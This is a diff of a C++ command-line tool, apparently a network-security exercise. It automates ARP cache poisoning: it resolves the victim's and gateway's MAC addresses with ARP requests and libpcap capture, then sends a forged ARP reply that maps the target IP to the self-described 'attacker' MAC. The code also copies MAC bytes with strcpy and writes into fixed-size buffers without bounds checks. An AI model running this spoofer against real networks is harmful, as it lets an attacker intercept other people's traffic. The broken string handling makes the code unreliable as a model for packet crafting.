@@ -9,53 +9,89 @@
 #include <sys/socket.h>
 #include <linux/if_packet.h>
 #include <net/if.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+#include <thread>
 
 using namespace std;
+
+#define PROMISCUOUS 1
+#define NONPROMISCUOUS 0
+
+struct ARPPacket{
+    struct ether_header eh;
+    struct ether_arp arp;
+};
 
 void checkArgc(int argc);
 void macAddrToHex(char* argvMac, u_int8_t *retnMac);
 void findMyMac(char* device, u_int8_t *myMAC);
 void printByHexData(u_int8_t* printArr,int length);
 void printByMAC(u_int8_t *printArr, int length);
+void printLine();
+void sendARPReguest(char* device, char *sender_IP, u_int8_t* my_MAC);
+void sendARPReply(char* device, u_int8_t *sender_Mac, ARPPacket *arpReply, int packeLen);
+void getMyIP(char* device, u_int8_t* myIP);
+int  findARPReply(char* device, char* rule, u_int8_t *retnMAC);
 
-/*send_arp <dev> <sender ip> <target ip> <sender mac> <target mac>*/
+/*send_arp <dev> <sender ip> <target ip>*/
 
 int main(int argc, char *argv[])
 {
     checkArgc(argc); //check argc & if wrong sentence print usage
 
+    char* device = argv[1];
+    char* senderIp=argv[2];
+    char* targetIp=argv[3];
 
-    //u_int32_t sender_Addr;
-    //inet_pton(AF_INET,senderIp,&sender_Addr); //ipv4 binary data is saved sender_Addr(little endian)
+    u_int8_t my_Mac[ETHER_ADDR_LEN]; //hexed MAC Address
+    findMyMac(device,my_Mac);
 
 
-    //u_int32_t target_Addr;
-    //inet_pton(AF_INET,targetIp,&target_Addr);
+    u_int8_t myIP[16];
+    getMyIP(device,myIP);
+
+    char senderRules[50]="dst net ";
+    strcat(senderRules,(char*)myIP);//dst net myIP
+    strcat(senderRules," and "); //dst net myIP and
+    strcat(senderRules,"src net ");//dst net myIP and src net
+
+    char targetRules[50];
+    memcpy(targetRules,senderRules,sizeof(senderRules)); //copy
+    strcat(senderRules,senderIp);
 
 
+
+    //find sender MAC
     u_int8_t sender_Mac[ETHER_ADDR_LEN];
-    macAddrToHex(argv[4],sender_Mac);
-    cout<<"Sender MAC : "<<argv[4]<<endl;
-
+    thread t1(&findARPReply,device,senderRules,sender_Mac);
+    sleep(1);
+    thread t2(&sendARPReguest,device,senderIp,my_Mac);
+    t1.join();
+    t2.join();
+    //find target MAC
     u_int8_t target_Mac[ETHER_ADDR_LEN];
-    macAddrToHex(argv[5],target_Mac);
-    cout<<"Target MAC : "<<argv[5]<<endl;
+    strcat(targetRules,targetIp);
+    thread t3(&findARPReply,device,targetRules,target_Mac);
+    sleep(1);
+    thread t4(&sendARPReguest,device,targetIp,my_Mac);
+    t3.join();
+    t4.join();
+
+
+
+    cout<<"Sender MAC : ";
+    printByMAC(sender_Mac,ETHER_ADDR_LEN);
+
+    cout<<"Target MAC : ";
+    printByMAC(target_Mac,ETHER_ADDR_LEN);
 
     ether_header ep;
 
     strcpy((char*)ep.ether_dhost,(char*)sender_Mac); //destnation mac is sender mac
-
-    char* device = argv[1];
-    u_int8_t my_Mac[ETHER_ADDR_LEN];
-
-    findMyMac(device,my_Mac);
-
-
     strcpy((char*)ep.ether_shost,(char*)my_Mac); //source mac is my mac
 
     ep.ether_type=htons(ETHERTYPE_ARP); //define next protocol
-
-//    inet_pton(AF_INET,argv[2],&iph.ip_dst); //set destination IP to SenderIP
 
 
     struct ether_arp arp;
@@ -67,51 +103,18 @@ int main(int argc, char *argv[])
     arp.ea_hdr.ar_op=ntohs(2);              //set opcode 2(reply)
 
 
-    char* senderIp=argv[2];
-    char* targetIp=argv[3];
-
     strcpy((char *)arp.arp_sha,(char *)my_Mac);  //set Source Address to Sender MAC
     inet_pton(AF_INET,targetIp,arp.arp_spa);     //set Source Protocol Address to Target IP
     strcpy((char*)arp.arp_tha,(char*)sender_Mac); //set Target Hardware Address to Sender MAC
-    //macAddrToHex((char*)sender_Mac,arp.arp_tha);
     inet_pton(AF_INET,senderIp,arp.arp_tpa);    //set Target Protocol Address to Sender IP
 
 
-    int packetLen = sizeof(struct ether_header)+sizeof(ether_arp);
+    struct ARPPacket ARPReply;
 
-    u_int8_t arpReply[packetLen];
+    memcpy(&ARPReply.eh,&ep,sizeof(struct ether_header));
+    memcpy(&ARPReply.arp,&arp,sizeof(struct ether_arp));
 
-    memcpy(arpReply,&ep,sizeof(struct ether_header));
-    memcpy(&arpReply[sizeof(struct ether_header)],&arp,sizeof(struct ether_arp));
-
-    int sock=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ARP));
-    cout<<"socket discryptor number : "<<sock<<endl;
-
-    cout<<"Send Arp Packet Data "<<endl;
-    printByHexData(arpReply,packetLen);
-
-
-     struct sockaddr_ll dest;
-
-     memset(&dest,0,sizeof(dest)); //init
-     dest.sll_family=htons(PF_PACKET);
-     dest.sll_protocol=htons(ETH_P_ARP);
-     //dest.sll_halen=0;
-     dest.sll_ifindex=if_nametoindex(device);
-     //dest.sll_hatype = htons(ARPHRD_ETHER);
-     //dest.sll_pkttype=PACKET_OTHERHOST;
-
-     memcpy(dest.sll_addr,sender_Mac,6);
-
-
-
-     cout<<"Device Index : "<<(int)dest.sll_ifindex<<endl;
-     u_int8_t *ptest=(u_int8_t*)&dest;
-     printByHexData(ptest,sizeof(dest));
-
-    if(sendto(sock,arpReply,packetLen,0,(struct sockaddr*)&dest,sizeof(dest))==-1) // broad cast
-         cout<<strerror(errno)<<endl;
-
+    sendARPReply(device,sender_Mac,&ARPReply,sizeof(struct ARPPacket)); //send reply packet
 
 
 
@@ -120,10 +123,9 @@ int main(int argc, char *argv[])
 
 void checkArgc(int argc)
 {
-    if(argc!=6)
+    if(argc!=4)
     {
-        cout<<" *Usage :  send_arp <dev> <sender ip> <target ip> <sender mac> <target mac>"<<endl;
-        cout<<" *MAC Address type : ab:cd:ef:ab:cd:ef "<<endl;
+        cout<<" *Usage :  send_arp <dev> <sender ip> <target ip>"<<endl;
         exit(0);
     }
 }
@@ -200,6 +202,7 @@ void findMyMac(char* device,u_int8_t* myMAC)
     cout<<"My(Attacker) MAC Address : ";
     printByMAC(myMAC,6);
 
+
 }
 
 void printByHexData(u_int8_t *printArr, int length)
@@ -216,6 +219,7 @@ void printByHexData(u_int8_t *printArr, int length)
     }
 
     cout<<dec<<endl;
+    printLine();
 }
 
 void printByMAC(u_int8_t *printArr,int length)
@@ -230,4 +234,202 @@ void printByMAC(u_int8_t *printArr,int length)
     }
 
     cout<<dec<<endl<<endl;
+}
+
+void printLine()
+{
+    cout<<"-----------------------------------------------"<<endl;
+}
+
+void sendARPReguest(char *device, char *senderIP,u_int8_t* my_MAC)
+{
+
+    struct ether_header eARPRequest;
+    u_int8_t broadcast[]={0xff,0xff,0xff,0xff,0xff,0xff};
+
+    memcpy(eARPRequest.ether_dhost,broadcast,ETHER_ADDR_LEN); //set destination address to broadcast
+    memcpy(eARPRequest.ether_shost,my_MAC,ETHER_ADDR_LEN); //set source address to myMAC
+    eARPRequest.ether_type=htons(ETH_P_ARP);
+
+
+    struct ether_arp arp;
+
+    arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
+    arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
+    arp.ea_hdr.ar_hln=6;                    //set Hardware Size 6 -> MAC address size
+    arp.ea_hdr.ar_pln=4;                    //set Protocol length 4 -> 4 IP address size
+    arp.ea_hdr.ar_op=ntohs(1);              //set opcode 1(request)
+
+    u_int8_t ARPTargetMAC[ETHER_ADDR_LEN]={0x00,0x00,0x00,0x00,0x00,0x00};
+
+    u_int8_t myIP[16];
+
+    getMyIP(device,myIP);
+
+    strcpy((char *)arp.arp_sha,(char *)my_MAC);  //set Source Address to Sender MAC
+    inet_pton(AF_INET,(char*)myIP,arp.arp_spa);     //set Source Protocol Address to My IP
+    strcpy((char*)arp.arp_tha,(char*)ARPTargetMAC); //set Target Hardware Address to Sender MAC
+    inet_pton(AF_INET,senderIP,arp.arp_tpa);    //set Target Protocol Address to Sender IP
+
+
+
+    struct ARPPacket ARPRequest;
+
+    memcpy(&ARPRequest.eh,&eARPRequest,sizeof(struct ether_header));
+    memcpy(&ARPRequest.arp,&arp,sizeof(struct ether_arp));
+
+    cout<<"Send ARP Request Packet !!"<<endl;
+
+    int sock=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ARP));
+    cout<<"socket discryptor number : "<<sock<<endl<<endl;
+
+    cout<<"Send Arp Packet Data "<<endl;
+
+    u_int8_t *ARP = (u_int8_t*)&ARPRequest;
+    printByHexData(ARP,sizeof(struct ARPPacket));
+
+
+    struct sockaddr_ll dest;
+
+     memset(&dest,0,sizeof(dest)); //init
+     dest.sll_family=htons(PF_PACKET);
+     dest.sll_protocol=htons(ETH_P_ARP);
+     dest.sll_halen=6; //Address Length
+     dest.sll_ifindex=if_nametoindex(device);
+
+     memcpy(dest.sll_addr,ARPTargetMAC,ETHER_ADDR_LEN); //desination MAC
+
+    if(sendto(sock,ARP,sizeof(struct ARPPacket),0,(struct sockaddr*)&dest,sizeof(dest))==-1)
+         cout<<strerror(errno)<<endl;
+}
+
+void sendARPReply(char* device,u_int8_t* sender_Mac,ARPPacket *ARPReply,int packetLen)
+{
+
+    u_int8_t *arpReply=(u_int8_t*)ARPReply;
+    cout<<endl;
+    cout<<"Send ARP Reply Packet !!!"<<endl;
+
+    int sock=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ARP));
+    cout<<"socket discryptor number : "<<sock<<endl<<endl;
+
+    cout<<"Send Arp Packet Data "<<endl;
+    printByHexData(arpReply,packetLen);
+
+
+    struct sockaddr_ll dest;
+
+     memset(&dest,0,sizeof(dest)); //init
+     dest.sll_family=htons(PF_PACKET);
+     dest.sll_protocol=htons(ETH_P_ARP);
+     dest.sll_halen=6; //Address Length
+     dest.sll_ifindex=if_nametoindex(device);
+
+     memcpy(dest.sll_addr,sender_Mac,ETHER_ADDR_LEN);
+
+     cout<<endl;
+
+     cout<<"Device Index : "<<(int)dest.sll_ifindex<<endl<<endl;
+     u_int8_t *ptest=(u_int8_t*)&dest;
+     cout<<"Sockaddr_ll data"<<endl;
+     printByHexData(ptest,sizeof(dest));
+
+
+
+    if(sendto(sock,arpReply,packetLen,0,(struct sockaddr*)&dest,sizeof(dest))==-1)
+         cout<<strerror(errno)<<endl;
+
+
+
+}
+
+void getMyIP(char* device, u_int8_t* myIP)//return dotted decimal
+{
+    int fd;
+    struct ifreq ifr;
+
+    fd=socket(AF_INET,SOCK_DGRAM,0);
+
+
+    ifr.ifr_ifru.ifru_addr.sa_family=AF_INET; //input type
+    strcpy(ifr.ifr_ifrn.ifrn_name,device); // input device name
+
+    ioctl(fd,SIOCGIFADDR,&ifr); //SIOCGIFADDR -> Get Protocol Address
+    close(fd);
+
+    u_int8_t ipstr[16];//xxx.xxx.xxx.xxx
+
+    inet_ntop(AF_INET,ifr.ifr_ifru.ifru_addr.sa_data+2,(char*)ipstr,sizeof(struct sockaddr));
+
+    strcpy((char*)myIP,(char*)ipstr);
+}
+
+int findARPReply(char *device, char *rule,u_int8_t *retnMAC)
+{
+
+    bpf_u_int32 netp;
+    bpf_u_int32 maskp;
+
+    char errBuf[PCAP_ERRBUF_SIZE];
+
+    int ret = pcap_lookupnet(device,&netp,&maskp,errBuf);
+    if(ret<0)
+    {
+        perror(errBuf);
+    }
+    pcap_t *pcd;
+
+
+    if((pcd=pcap_open_live(device,BUFSIZ,NONPROMISCUOUS,1,errBuf))==NULL)
+    {
+        perror(errBuf);
+        exit(1);
+    }
+
+    struct bpf_program fp;
+
+    if(pcap_compile(pcd,&fp,rule,0,netp)==-1)
+    {
+        cout<<"Set comfile error!!!"<<endl;
+        exit(1);
+    }
+
+    if(pcap_setfilter(pcd,&fp)==-1)
+    {
+        cout<<"Setfilter error"<<endl;
+        exit(1);
+    }
+
+
+    const u_char *pkt_data;
+    struct pcap_pkthdr *pktHeader;
+    int valueOfNextEx;
+
+    while(true)
+    {
+
+        //need a thread
+        valueOfNextEx=pcap_next_ex(pcd,&pktHeader,&pkt_data);
+
+        switch (valueOfNextEx)
+        {
+            case 1:
+                   struct ether_header *ep;
+                   ep=(struct ether_header*)pkt_data;
+                   strcpy((char*)retnMAC,(char*)ep->ether_shost);
+                   return 0;
+            case 0:
+                cout<<"need a sec.. to packet capture"<<endl;
+                continue;
+            case -1:
+                perror("pcap_next_ex function has an error!!");
+                exit(1);
+
+            case -2:
+                cout<<"the packet have reached EOF!!"<<endl;
+                exit(0);
+            default:
+                break;
+            }
+    }
 }
